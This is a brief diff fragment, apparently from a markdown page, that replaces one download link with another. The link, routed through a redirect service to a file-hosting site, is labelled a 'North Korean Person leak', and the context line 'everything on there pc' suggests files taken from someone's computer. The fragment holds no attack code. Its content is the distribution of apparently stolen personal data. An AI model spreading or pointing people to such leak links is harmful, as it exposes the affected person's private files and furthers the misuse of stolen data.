@@ -26,4 +26,4 @@ everything on there pc 🤷
 
 ## Download link
 
-[North Korean Person leak Download Link](https://redirect.trace.rip/?url=https://rentry.co/HDBA-north-korea)
+<a href="https://redirect.trace.rip/?url=https://buzzheavier.com/v9zep2gznqqv" target="_blank" rel="noopener">North Korean Person leak Download Link</a>
